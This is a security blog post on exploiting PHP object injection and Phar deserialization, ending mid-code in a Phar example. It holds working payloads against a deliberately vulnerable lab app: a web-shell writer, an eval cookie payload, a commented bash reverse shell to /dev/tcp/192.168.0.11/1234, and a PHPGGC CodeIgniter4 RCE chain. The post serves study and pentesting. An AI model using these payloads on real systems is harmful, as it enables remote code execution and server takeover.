<!DOCTYPE html>
<html>

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>PHP Object Injection Exploitation Notes</title>
  <meta name="description" content="Notes I‚Äôve written and Collected about PHP Deserialization">
  
  <meta name="author" content="Sam Sanoop">
  <meta name="copyright" content="&copy; Sam Sanoop 2021">
  

  <!-- External libraries -->
  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/styles/monokai-sublime.min.css">
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.7.1/css/lightbox.css">

  <!-- Favicon and other icons (made with http://www.favicon-generator.org/) -->
  <link rel="shortcut icon" href="/assets/icons/favicon.ico" type="image/x-icon">
  <link rel="icon" href="/assets/icons/favicon.ico" type="image/x-icon">
  <link rel="apple-touch-icon" sizes="57x57" href="/assets/icons/apple-icon-57x57.png">
  <link rel="apple-touch-icon" sizes="60x60" href="/assets/icons/apple-icon-60x60.png">
  <link rel="apple-touch-icon" sizes="72x72" href="/assets/icons/apple-icon-72x72.png">
  <link rel="apple-touch-icon" sizes="76x76" href="/assets/icons/apple-icon-76x76.png">
  <link rel="apple-touch-icon" sizes="114x114" href="/assets/icons/apple-icon-114x114.png">
  <link rel="apple-touch-icon" sizes="120x120" href="/assets/icons/apple-icon-120x120.png">
  <link rel="apple-touch-icon" sizes="144x144" href="/assets/icons/apple-icon-144x144.png">
  <link rel="apple-touch-icon" sizes="152x152" href="/assets/icons/apple-icon-152x152.png">
  <link rel="apple-touch-icon" sizes="180x180" href="/assets/icons/apple-icon-180x180.png">
  <link rel="icon" type="image/png" sizes="192x192"  href="/assets/icons/android-icon-192x192.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/assets/icons/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="96x96" href="/assets/icons/favicon-96x96.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/assets/icons/favicon-16x16.png">
  <link rel="manifest" href="/assets/icons/manifest.json">
  <meta name="msapplication-TileColor" content="#ffffff">
  <meta name="msapplication-TileImage" content="/assets/icons/ms-icon-144x144.png">
  <meta name="theme-color" content="#ffffff">

  
  <!-- Facebook OGP cards -->
  <meta property="og:description" content="Notes I‚Äôve written and Collected about PHP Deserialization" />
  <meta property="og:url" content="http://snoopysecurity.github.io" />
  <meta property="og:site_name" content="üíª | Blog" />
  <meta property="og:title" content="PHP Object Injection Exploitation Notes" />
  <meta property="og:type" content="website" />
  <meta property="og:image" content="http://snoopysecurity.github.io/assets/logo.png" />
  <meta property="og:image:type" content="image/png" />
  <meta property="og:image:width" content="612" />
  <meta property="og:image:height" content="605" />
  

  
  <!-- Twitter: card tags -->
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="PHP Object Injection Exploitation Notes">
  <meta name="twitter:description" content="Notes I‚Äôve written and Collected about PHP Deserialization">
  <meta name="twitter:image" content="http://snoopysecurity.github.io/assets/logo.png">
  <meta name="twitter:url" content="http://snoopysecurity.github.io">
  

  

  <!-- Site styles -->
  <link rel="stylesheet" href="/css/main.css">
  <link rel="canonical" href="http://snoopysecurity.github.io/web-application-security/2021/01/08/02_php_object_injection_exploitation-notes.html">
  <link rel="alternate" type="application/rss+xml" title="üíª | Blog" href="http://snoopysecurity.github.io/feed.xml" />
</head>


  <body>

    <header class="navigation" role="banner">
  <div class="navigation-wrapper">
    <a href="/" class="logo">
      
      <img src="/assets/logo.png" alt="üíª | Blog">
      
    </a>
    <a href="javascript:void(0)" class="navigation-menu-button" id="js-mobile-menu">
      <i class="fa fa-bars"></i>
    </a>
    <nav role="navigation">
      <ul id="js-navigation-menu" class="navigation-menu show">
        
          
          <li class="nav-link"><a href="/about/">About</a>
          
        
          
        
          
        
          
        
          
          <li class="nav-link"><a href="/posts/">Posts</a>
          
        
          
        
          
        
          
        
          
        
          
        
      </ul>
    </nav>
  </div>
</header>


    <div class="page-content">
        <div class="post">

<div class="post-header-container " >
  <div class="scrim ">
    <header class="post-header">
      <h1 class="title">PHP Object Injection Exploitation Notes</h1>
      <p class="info">by <strong>snoopysecurity</strong></p>
    </header>
  </div>
</div>

<div class="wrapper">

 <span class="page-divider">
  <span class="one"></span>
  <span class="two"></span>
</span>
 

<section class="post-meta">
  <div class="post-date">January 8, 2021</div>
  <div class="post-categories">
  in 
    
    <a href="/category/web-application-security">Web-application-security</a>
    
  
  </div>
</section>

<article class="post-content">
  <p><em>Notes I‚Äôve written and Collected about PHP Deserialization</em></p>

<h2 id="introduction">Introduction</h2>

<h2 id="serialize-and-unserialize">serialize and unserialize</h2>

<p>Serialization functions are commonly used within software to store data to a file, a memory buffer, or transmitted across to another network which can then be deserialized at a later date. Within PHP, The <a href="https://www.php.net/manual/en/function.serialize.php">serialize()</a> function can be used to convert a value to an serialized object. This function can be used to convert a value/object to a serialized value. An example of this can be seen below:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>&lt;?php
class Test
{
    public $name = "Snoopy";
    public $age = 0.1;
    public $secret = 0;
    public $hobbies = array("bughunting", "softwaresecurity");
    public $bug_hunter = True;
}

$object = new Test();
$serialized = serialize($object);
echo $serialized;
?&gt;
</code></pre>
</div>

<p>The serialized form of the above object can be seen as</p>

<div class="highlighter-rouge"><pre class="highlight"><code>O:4:"Test":5:{s:4:"name";s:6:"Snoopy";s:3:"age";d:0.1;s:6:"secret";i:0;s:7:"hobbies";a:2:{i:0;s:10:"bughunting";i:1;s:16:"softwaresecurity";}s:10:"bug_hunter";b:1;}

</code></pre>
</div>

<p>This structure can be understood as:</p>

<ul>
  <li><strong>O:Length of Object name :‚ÄùClass Name‚Äù:Number of Properties in Class:{Properties}</strong> - <code class="highlighter-rouge">O:4:"Test":5</code></li>
  <li><strong>{ data }</strong> - Denotes the data structure of the object with the 5 properties - <code class="highlighter-rouge">$name, $age, $secret, $hobbies, $bug_hunter</code></li>
  <li><strong>s:Length of the String:‚ÄùString Value‚Äù;</strong> - <code class="highlighter-rouge">s:4:"name";s:6:"Snoopy";</code></li>
  <li><strong>d:Float;</strong> - <code class="highlighter-rouge">s:3:"age";d:0.1;</code></li>
  <li><strong>i:Integer;</strong> - <code class="highlighter-rouge">s:6:"secret";i:0;</code></li>
  <li><strong>a:Number of Elements:{Elements}</strong> - <code class="highlighter-rouge">a:2:{i:0;s:10:"bughunting";i:1;s:16:"softwaresecurity";}</code></li>
  <li><strong>b:boolean;</strong> - <code class="highlighter-rouge">s:10:"bug_hunter";b:1;</code></li>
</ul>

<p>This can be converted back to an object from using the <a href="https://www.php.net/manual/en/function.unserialize.php">unserialize()</a> function. <code class="highlighter-rouge">unserialize</code> has two parameters:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>unserialize ( string $data , array $options = [] ) : mixed
</code></pre>
</div>

<ul>
  <li>The <code class="highlighter-rouge">$data</code> parameter takes a serialized string that can be deserialized</li>
  <li>The <code class="highlighter-rouge">$options</code> array can be used to specify <code class="highlighter-rouge">allowed_classes</code>. <code class="highlighter-rouge">allowed_classes</code> can be used to whitelist class names that should be accepted. If this is used and  <code class="highlighter-rouge">unserialize()</code> encounters an object of a class that isn‚Äôt to be accepted, then the object will be instantiated as a <code class="highlighter-rouge">__PHP_Incomplete_Class</code> instead.</li>
</ul>

<div class="highlighter-rouge"><pre class="highlight"><code>&lt;?php

$object = 'O:4:"Test":5:{s:4:"name";s:6:"Snoopy";s:3:"age";d:0.1;s:6:"secret";i:0;s:7:"hobbies";a:2:{i:0;s:10:"bughunting";i:1;s:16:"softwaresecurity";}s:10:"bug_hunter";b:1;}';
$unserialized = unserialize(var_dump($object));
echo $unserialized;
?&gt;
</code></pre>
</div>

<p>During deserialization, <code class="highlighter-rouge">unserialize</code> will take the user input, this input will have some objects along with the class and the properties of that object, and will create an instance of the provided class and object in memory (Object Instantiation) and creates a copy of the originally serialized object. As per PHP documentation, after successfully reconstructing the object, PHP will automatically attempt to call the the  <code class="highlighter-rouge">__wakeup()</code> magic method as well (if one exists) and execute code in that function if it is defined for the class. This function can reconstruct any resources that the object may have. The intended use of <code class="highlighter-rouge">__wakeup()</code> is to reestablish any database connections that may have been lost during serialization and perform other reinitialization tasks. Once this is done, then the <code class="highlighter-rouge">__destruct()</code> magic method of that class will be called to when no reference to the deserialized object instance exists.</p>

<p><code class="highlighter-rouge">serialize()</code> will save all properties in the object and the class the object belongs to during serialization but no methods of the class of the object will be stored.
As such, when <code class="highlighter-rouge">unserialize</code> is triggered, the class of the object will have to be defined in advance in code (definition of the class needs to be present in the file unserialize() is called in), or through autoloading. If the class is not already defined in the file, the object will be instantiated as <code class="highlighter-rouge">__PHP_Incomplete_Class</code>, which has no methods.</p>

<h2 id="object-injection">Object Injection</h2>

<p>PHP Object Injection/Unserialization happens when untrusted user input is being executed by the <code class="highlighter-rouge">unserialize</code> function which can result in code being loaded and executed due to object instantiation and autoloading, and a malicious user may be able to exploit this.</p>

<p>This was initially made public by Stefan Esser</p>

<ul>
  <li><a href="https://owasp.org/www-pdf-archive/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf">https://owasp.org/www-pdf-archive/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf</a></li>
  <li><a href="https://owasp.org/www-pdf-archive/POC2009-ShockingNewsInPHPExploitation.pdf">https://owasp.org/www-pdf-archive/POC2009-ShockingNewsInPHPExploitation.pdf</a></li>
  <li><a href="https://wiki.php.net/rfc/secure_unserialize">https://wiki.php.net/rfc/secure_unserialize</a></li>
</ul>

<h3 id="requirements-for-a-successful-exploit">Requirements for a Successful Exploit</h3>

<ul>
  <li>PHP Magic Methods - The codebase/application being exploited needs to have interesting magic methods that can then be triggered through a POP chain.</li>
  <li>The POP gadget chain/object being called must be declared during when <code class="highlighter-rouge">unserialize</code> is being called ( <code class="highlighter-rouge">include()</code> or <code class="highlighter-rouge">require()</code>) or <a href="https://www.php.net/manual/en/language.oop5.autoload.php">object autoloading</a> (through composer (<code class="highlighter-rouge">require __DIR__ . '/vendor/autoload.php';</code>) or generic autoloading) must be supported for the target classes when <code class="highlighter-rouge">unserialize()</code> is being executed</li>
</ul>

<h3 id="php-magic-methods">PHP Magic Methods</h3>

<p>PHP Magic Methods are PHP classes that have magical properties in PHP. You cannot have functions with these names in any of your classes unless you want the magic functionality associated with them. More about this can be read from here: <a href="https://www.php.net/manual/en/language.oop5.magic.php">PHP Magic Methods Documentation</a>. During exploitation, these magic methods can be invoked by crafting a PHP POP gadget. This is because these methods are executed automatically when <code class="highlighter-rouge">unserialize()</code> is called on an object.</p>

<h4 id="magic-methods-most-useful-for-exploitation">Magic Methods most useful for exploitation</h4>

<ul>
  <li><code class="highlighter-rouge">__toString()</code> - Invoked when object is converted to a string. (by <code class="highlighter-rouge">echo</code> for example)</li>
  <li><code class="highlighter-rouge">__destruct()</code> - Invoked when an object is deleted. When no reference to the deserialized object instance exists, __destruct() is called.</li>
  <li><code class="highlighter-rouge">__wakeup()</code>	- Invoked when an object is unserialized. automatically called upon object deserialization.</li>
  <li><code class="highlighter-rouge">__call()</code> - will be called if the object will ca1ll an inexistent function</li>
</ul>

<h4 id="magic-methods-that-could-be-useful-for-exploitation-not-useful-in-most-cases">Magic Methods that could be useful for exploitation (Not useful in Most Cases)</h4>

<ul>
  <li><code class="highlighter-rouge">__set()</code> - called if the object try to access inexistent class variables</li>
  <li><code class="highlighter-rouge">__isset()</code></li>
  <li><code class="highlighter-rouge">__invoke()</code></li>
  <li><code class="highlighter-rouge">__unset()</code></li>
  <li><code class="highlighter-rouge">__set_state()</code></li>
  <li><code class="highlighter-rouge">__callStatic()</code></li>
  <li><code class="highlighter-rouge">__sleep()</code> - called when an object is serialized (with serialize)</li>
  <li><code class="highlighter-rouge">__clone()</code></li>
  <li><code class="highlighter-rouge">__get()</code>	- called if the object try to access inexistent class variables</li>
  <li><code class="highlighter-rouge">__debugInfo()</code></li>
  <li><code class="highlighter-rouge">__construct()</code> - Invoked  when an object is created (constructor)</li>
</ul>

<h3 id="phpgcc">PHPGCC</h3>

<p>PHPGGC is a library of <code class="highlighter-rouge">unserialize()</code> payloads along with a command-line program. This can be used to generate POP gadgets from known libraries people have already found. PHPGGC supports gadget chains such as CodeIgniter4, Doctrine, Drupal7, Guzzle, Laravel, Magento, Monolog, Phalcon, Podio, Slim, SwiftMailer, Symfony, WordPress, Yii, and ZendFramework.</p>

<ul>
  <li>List all gadgets</li>
</ul>

<div class="highlighter-rouge"><pre class="highlight"><code>./phpggc -l

Gadget Chains
-------------

NAME                                      VERSION                        TYPE             VECTOR         I    
CodeIgniter4/RCE1                         4.0.0-beta.1 &lt;= 4.0.0-rc.4     rce              __destruct          
CodeIgniter4/RCE2                         4.0.0-rc.4 &lt;= 4.0.4+           rce              __destruct          
Doctrine/FW1                              ?                              file_write       __toString     *    
Drupal7/FD1                               7.0 &lt; ?                        file_delete      __destruct     *    
Drupal7/RCE1                              7.0.8 &lt; ?                      rce              __destruct     *  
</code></pre>
</div>

<ul>
  <li>Create a POP gadget using the <code class="highlighter-rouge">__destruct</code> vector known in versions <code class="highlighter-rouge">4.0.0-rc.4 &lt;= 4.0.4+</code>. Run the system command <code class="highlighter-rouge">id</code> using PHP‚Äôs <code class="highlighter-rouge">system</code> function.</li>
</ul>

<div class="highlighter-rouge"><pre class="highlight"><code>./phpggc CodeIgniter4/RCE2 system id


O:39:"CodeIgniter\Cache\Handlers\RedisHandler":1:{s:8:"*redis";O:45:"CodeIgniter\Session\Handlers\MemcachedHandler":2:{s:12:"*memcached";O:17:"CodeIgniter\Model":8:{s:10:"*builder";O:32:"CodeIgniter\Database\BaseBuilder":2:{s:6:"QBFrom";a:1:{i:0;s:2:"()";}s:2:"db";O:38:"CodeIgniter\Database\MySQLi\Connection":0:{}}s:13:"*primaryKey";N;s:15:"*beforeDelete";a:1:{i:0;s:8:"validate";}s:18:"*validationRules";a:1:{s:4:"id.x";a:1:{s:5:"rules";a:2:{i:0;s:6:"system";i:1;s:2:"dd";}}}s:13:"*validation";O:33:"CodeIgniter\Validation\Validation":1:{s:15:"*ruleSetFiles";a:1:{i:0;s:5:"finfo";}}s:21:"*tempAllowCallbacks";i:1;s:2:"db";O:38:"CodeIgniter\Database\MySQLi\Connection":0:{}s:20:"cleanValidationRules";b:0;}s:10:"*lockKey";a:1:{s:1:"x";s:2:"id";}}}
</code></pre>
</div>

<h3 id="hunting-for-pop-gadgets">Hunting For POP Gadgets</h3>

<p>Examples of interesting functionalities to look for within Magic Methods:</p>

<ul>
  <li>Arbritary File Write - <code class="highlighter-rouge">@unlink($fileobject)</code>, <code class="highlighter-rouge">file_put_contents($this-&gt;file)</code></li>
  <li>Code Execution - <code class="highlighter-rouge">eval($this-&gt;injectobject);</code></li>
  <li>Type Juggling - <code class="highlighter-rouge">if ($username == $adminName &amp;&amp; $password == $adminPassword) {</code> ( loose comparison operator ‚Äú==‚Äù, user input taken as arrays and type conversion occurs )</li>
  <li>Authentication Bypass through Object reference - <code class="highlighter-rouge">if (isset($this-&gt;obj)) return $this-&gt;obj-&gt;getValue();</code>, <code class="highlighter-rouge">($obj-&gt;check === $obj-&gt;secrethash) {echo "Pass";</code></li>
  <li>SQL Injection - $sql = <code class="highlighter-rouge">"SELECT * FROM table WHERE id = " . $id;</code></li>
</ul>

<p>Other Dangerous functions that might be useful to look for:</p>

<ul>
  <li><a href="https://gist.github.com/snoopysecurity/7afd189724bc02a14a7f89d9a8284b69">Dangerous PHP Functions  - https://gist.github.com/snoopysecurity/7afd189724bc02a14a7f89d9a8284b69</a></li>
  <li><a href="https://github.com/v-p-b/DangerousPHPFunctions">DangerousPHPFunctions - https://github.com/v-p-b/DangerousPHPFunctions</a></li>
</ul>

<p>When checking projects, <code class="highlighter-rouge">git clone</code> and execute <code class="highlighter-rouge">composer install</code> to install all dependencies, this can then be reviewed for useful POP gadget.</p>

<h3 id="example-httpsgithubcomweev3lkwa-object-injection">Example (https://github.com/weev3/LKWA) Object Injection</h3>

<p><img src="/assets/phpi/1.png" alt="" /></p>

<p>The following request is submitted by the application <a href="http://lkwa.local:3000/objectInjection/content.php">http://lkwa.local:3000/objectInjection/content.php</a></p>

<div class="highlighter-rouge"><pre class="highlight"><code>GET /objectInjection/content.php?object=O:8:%22stdClass%22:2:{s:4:%22data%22;s:9:%22Hey%20Dude!%22;s:4:%22text%22;s:26:%22upload%20shell%20if%20you%20can!!!%22;} HTTP/1.1
Host: lkwa.local:3000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://lkwa.local:3000/objectInjection/content.php
Upgrade-Insecure-Requests: 1
</code></pre>
</div>

<p>The following code is used server-side to unserialize the object.</p>

<p><a href="https://github.com/weev3/LKWA/blob/master/objectInjection/content.php#L40">https://github.com/weev3/LKWA/blob/master/objectInjection/content.php#L40</a></p>
<div class="highlighter-rouge"><pre class="highlight"><code>if(isset($_REQUEST['object'])){  
$var1=unserialize($_REQUEST['object']);
echo "&lt;br&gt;";
echo($var1-&gt;data); 
echo "&lt;br&gt;";
echo($var1-&gt;text);
}
</code></pre>
</div>

<p>Within <code class="highlighter-rouge">content.php</code>, the following file is also included:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>include("obj_injection.php");
</code></pre>
</div>

<p><code class="highlighter-rouge">obj_injection.php</code> contains the following code.</p>

<div class="highlighter-rouge"><pre class="highlight"><code>// https://github.com/weev3/LKWA/blob/master/objectInjection/content.php#L3


&lt;?php


class Foo{
    function __construct($filename, $data) {
        $this-&gt;filename = $filename . ".txt";
        $this-&gt;data = $data;
    }
    function __destruct(){
        file_put_contents($this-&gt;filename, $this-&gt;data);
    }
}
?&gt;
</code></pre>
</div>

<p>This can be exploited using a payload such as:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>&lt;?php

 class Foo{
    public $filename;
    public $data;

}

$obj = new Foo();
$obj-&gt;filename = '/var/www/html/shell.php';
$obj-&gt;data =  "&lt;?php echo shell_exec(\$_GET['e'].' 2&gt;&amp;1'); ?&gt;";
 
echo serialize($obj);
 
?&gt;
</code></pre>
</div>

<p>Serialized Payload:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>O:3:"Foo":2:{s:8:"filename";s:23:"/var/www/html/shell.php";s:4:"data";s:45:"&lt;?php echo shell_exec($_GET['e'].' 2&gt;&amp;1'); ?&gt;";}
</code></pre>
</div>

<h3 id="example-httpsgithubcomweev3lkwa-object-injection-cookie">Example (https://github.com/weev3/LKWA) Object Injection Cookie</h3>

<p>When the admin logs in the following cookie are set by the application:</p>

<p><img src="/assets/phpi/2.png" alt="" /></p>

<div class="highlighter-rouge"><pre class="highlight"><code>O:8:"stdClass":1:{s:4:"user";s:5:"admin";}
</code></pre>
</div>

<p>This is then unserialized:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>//https://github.com/weev3/LKWA/blob/master/objectInjection_cookie/content.php#L43

if(isset($_COOKIE['username']))
{

  $var = unserialize($_COOKIE['username']);
  echo "&lt;br&gt; Welcome ".$var-&gt;user;
}
</code></pre>
</div>

<p><code class="highlighter-rouge">Content.php</code> also includes <code class="highlighter-rouge">obj_injection.php</code> (<code class="highlighter-rouge">include("obj_injection.php");</code>) which has the following code:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>//http://lkwa.local:3000/objectInjection_cookie/content.php


&lt;?php

/**
 * Object Injection via Cookie
 */
class Foo{
	public $cmd;
    function __construct() {
    }
    function __destruct(){
        eval($this-&gt;cmd);
    }
}

?&gt;

</code></pre>
</div>

<p>This can be exploited using the following payload</p>

<div class="highlighter-rouge"><pre class="highlight"><code>&lt;?php
 

 class Foo{
    public $cmd;

}
///bin/bash -i &gt;&amp; /dev/tcp/192.168.0.11/1234 0&gt;&amp;1
$obj = new Foo();
$obj-&gt;cmd =  "system('uname -a');";

echo serialize($obj);
 
?&gt;

</code></pre>
</div>

<p>which generates the following serialized payload</p>

<div class="highlighter-rouge"><pre class="highlight"><code>O:3:"Foo":1:{s:3:"cmd";s:19:"system('uname -a');";}

</code></pre>
</div>

<p>This can now be set as a cookie and can be sent to the page to execute <code class="highlighter-rouge">uname -a</code> on the local system.</p>

<h3 id="example-httpsgithubcomweev3lkwa-object-injection-reference">Example (https://github.com/weev3/LKWA) Object Injection Reference</h3>

<p>A serialized payload sent from a user request is deserialized as follows:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>//https://github.com/weev3/LKWA/blob/master/objectref/objectref.php
                  if (isset($_POST['guess'])) {
                    // code...
                    $obj = unserialize($_POST['input']);
                    if($obj) {
                        $obj-&gt;guess = $_POST['guess'];
                        $obj-&gt;secretCode = rand(500000,999999);
                        if($obj-&gt;guess === $obj-&gt;secretCode) {
                            echo "&lt;p class='text-success'&gt;You Win !!!!!&lt;/p&gt;";
                        }
                        else{
                        	echo "&lt;p class='text-danger'&gt;Loser!!!!&lt;/p&gt;";
                        }
</code></pre>
</div>

<p>This check can be bypassed by calling both objects and referencing each other.</p>

<div class="highlighter-rouge"><pre class="highlight"><code>&lt;?php
 

 class Object1
 {
   public $guess;
   public $secretCode;
 }
 
$obj = new Object1();
$obj-&gt;guess =  &amp;$obj-&gt;secretCode;
echo serialize($obj);
 
?&gt;
</code></pre>
</div>

<p>Payload:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>O:7:"Object1":2:{s:5:"guess";N;s:10:"secretCode";R:2;}
</code></pre>
</div>

<p>The following request can now be sent</p>

<div class="highlighter-rouge"><pre class="highlight"><code>POST /objectref/objectref.php HTTP/1.1
Host: lkwa.local:3000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 112
Origin: http://lkwa.local:3000
Connection: close
Referer: http://lkwa.local:3000/objectref/objectref.php
Cookie: PHPSESSID=741de8227f5dedc8918a2018980d0819; username=O%3A8%3A%22stdClass%22%3A1%3A%7Bs%3A4%3A%22user%22%3Bs%3A5%3A%22admin%22%3B%7D
Upgrade-Insecure-Requests: 1

guess=ss&amp;input=%4f%3a%37%3a%22%4f%62%6a%65%63%74%31%22%3a%32%3a%7b%73%3a%35%3a%22%67%75%65%73%73%22%3b%4e%3b%73%3a%31%30%3a%22%73%65%63%72%65%74%43%6f%64%65%22%3b%52%3a%32%3b%7d
</code></pre>
</div>

<h3 id="real-world-vulnerabilities">Real World Vulnerabilities</h3>

<ul>
  <li><a href="https://websec.wordpress.com/2015/01/09/drupal-7-34-admin-php-object-injection/">Drupal 7.34 Admin PHP Object Injection</a></li>
  <li><a href="https://blog.redforce.io/attacking-helpdesks-part-1-rce-chain-on-deskpro-with-bitdefender-as-case-study/">Executing Arbitrary Code on Bitdefender Helpdesk</a></li>
  <li><a href="https://blog.ripstech.com/2018/prestashop-remote-code-execution/">Prestashop Remote Code Execution</a></li>
</ul>

<h3 id="useful-notes">Useful Notes</h3>

<ul>
  <li>Leading zeroes &amp; Arbitrary Chars can be used which won‚Äôt change logic: <code class="highlighter-rouge">O:008:"stdClass":0001**s:006:"bypass";b:1;}</code></li>
  <li>One way to find PHP deserialization black box is to provide a serialized <code class="highlighter-rouge">PDO</code> object to injection points. This will usually end in an error 500 response which is an indication of PHP deserialization. The <code class="highlighter-rouge">php-object-injection-check</code> burp extension can be used to automate this: <a href="https://github.com/securifybv/PHPUnserializeCheck">https://github.com/securifybv/PHPUnserializeCheck</a></li>
  <li><a href="https://github.com/ricardojba/poi-slinger">https://github.com/ricardojba/poi-slinger</a> burp extension can be used to quickly create out of band payloads from <code class="highlighter-rouge">PHPGGC</code> during testing.</li>
</ul>

<h3 id="how-to-patch">How to Patch</h3>

<ul>
  <li>Use a safe, standard data interchange format such as JSON (via <code class="highlighter-rouge">json_decode()</code> and <code class="highlighter-rouge">json_encode()</code>) if you need to pass serialized data to the user.</li>
</ul>

<h3 id="referencesfurther-reading">References/Further Reading</h3>

<ul>
  <li><a href="https://notsosecure.com/remote-code-execution-via-php-unserialize/">https://notsosecure.com/remote-code-execution-via-php-unserialize/</a></li>
  <li><a href="https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection">https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection</a></li>
  <li><a href="https://www.pentestpeople.com/php-deserialisation-object-injection/">https://www.pentestpeople.com/php-deserialisation-object-injection/</a></li>
  <li><a href="https://securitycafe.ro/2015/01/05/understanding-php-object-injection/">https://securitycafe.ro/2015/01/05/understanding-php-object-injection/</a></li>
  <li><a href="https://insomniasec.com/cdn-assets/Practical_PHP_Object_Injection.pdf">https://insomniasec.com/cdn-assets/Practical_PHP_Object_Injection.pdf</a></li>
  <li><a href="https://www.synacktiv.com/en/publications/typo3-leak-to-remote-code-execution.html">https://www.synacktiv.com/en/publications/typo3-leak-to-remote-code-execution.html</a></li>
  <li><a href="https://web.archive.org/web/20150317142538/https://scott.arciszewski.me/research/view/php-framework-timing-attacks-object-injection">php-framework-timing-attacks-object-injection</a></li>
  <li><a href="https://blog.redteam-pentesting.de/2021/deserialization-gadget-chain/">PHP Deserialization Gadget Chains</a></li>
  <li><a href="https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/README.md#babyh-master-php-2017">babyh-master-php-2017</a></li>
  <li><a href="https://github.com/TYPO3/phar-stream-wrapper">phar-stream-wrapper</a></li>
  <li><a href="https://srcincite.io/blog/2018/10/02/old-school-pwning-with-new-school-tricks-vanilla-forums-remote-code-execution.html">Vanilla Forums RCE</a></li>
  <li><a href="https://www.slideshare.net/_s_n_t/php-unserialization-vulnerabilities-what-are-we-missing">PHP Deserialization - What are we missing</a></li>
</ul>

<h3 id="phar-file-format">Phar File Format</h3>

<p>Phar (PHP Archive) files can be used to package PHP applications and PHP libraries into one archive file. The PHAR format in PHP uses single file format which can be used to store and execute multiple PHP code. Phar files contain metadata about the files in the archive. In a phar file, metadata is stored in a serialized format</p>

<p>A structure of a PHAR file is as follows:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>* A stub ‚Äì which is a PHP code sequence acting as a bootstrapper when the Phar is being run as a standalone application; as a minimum, it must contain the following code:
`&lt;?php __HALT_COMPILER();`
* A manifest describing a source file included in the archive; optionally, holds serialized meta-data (this serialized chunk is a critical link in the exploitation chain as we will see further on)
* A source file (the actual Phar functionality)
* An optional signature, used for integrity checks
</code></pre>
</div>

<p>Phar files can be called using the following URI: <code class="highlighter-rouge">phar://full/or/relative/path</code>. Furthermore, a phar file extension doesn‚Äôt get checked when declaring a stream, making phar files veritable polyglot candidates. If a filesystem function is called with a phar stream as an argument, the Phar‚Äôs serialized metadata automatically gets unserialized, by design. More about the PHP Phar format can be seen here: <a href="https://www.php.net/manual/en/book.phar.php">https://www.php.net/manual/en/book.phar.php</a></p>

<h3 id="phar-deserialization">Phar Deserialization</h3>

<p>Discovered by Sam Thomas and initially discovered by Orange Tsai (Separately), if a file operation is performed on a <code class="highlighter-rouge">phar</code> file via the <code class="highlighter-rouge">phar://</code> wrapper, the phar file‚Äôs metadata would be unserialized. As such an attacker could perform PHP object injection without the use of the <code class="highlighter-rouge">unserialize()</code> function by uploading a phar file.</p>

<p>Sam Thomas‚Äôs work can be seen below:</p>

<ul>
  <li><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf">BlackHat USA 2018 - Its A PHP Unserialization Vulnerability Jim But Not As We Know It Slides</a></li>
  <li><a href="https://www.youtube.com/watch?v=OrEar0TiS90">BlackHat USA 2018 - Its A PHP Unserialization Vulnerability Jim But Not As We Know It Video</a></li>
</ul>

<h3 id="requirements-for-a-successful-phar-deserialization">Requirements for a Successful Phar Deserialization</h3>

<ul>
  <li>A PHP filesystem function that can be controlled which will trigger  <code class="highlighter-rouge">unserialize()</code></li>
  <li>The ability to upload a PHAR file to the target system and the path of this file to be known</li>
</ul>

<p>The following file system functions can trigger <code class="highlighter-rouge">unserialize()</code> by providing a <code class="highlighter-rouge">phar://</code> wrapper</p>

<div class="highlighter-rouge"><pre class="highlight"><code>copy                file_exists         file_get_contents   file_put_contents   
file                fileatime           filectime           filegroup           
fileinode           filemtime           fileowner           fileperms           
filesize            filetype            fopen               is_dir              
is_executable       is_file             is_link             is_readable         
is_writable         lstat               mkdir               parse_ini_file      
readfile            rename              rmdir               stat                
touch               unlink              
</code></pre>
</div>

<p><strong>Note:</strong> Just like normal object injection, PHP Magic Methods and autoloading/include of the POP gadget to trigger is still needed.</p>

<h3 id="example-httpsgithubcomweev3lkwa-phar-deserialization">Example (https://github.com/weev3/LKWA) Phar Deserialization</h3>

<p>An upload functionality exists in <code class="highlighter-rouge">upload.php</code></p>

<p><img src="/assets/phpi/3.png" alt="" /></p>

<div class="highlighter-rouge"><pre class="highlight"><code>&lt;?php
include("sidebar.php");
$target_dir = "uploads/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
$uploadOk = 1;
$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));
// Check if image file is a actual image or fake image
if(isset($_POST["submit"])) {
    if($imageFileType !== "PHAR") {
        $uploadOk = 1;
    } else {
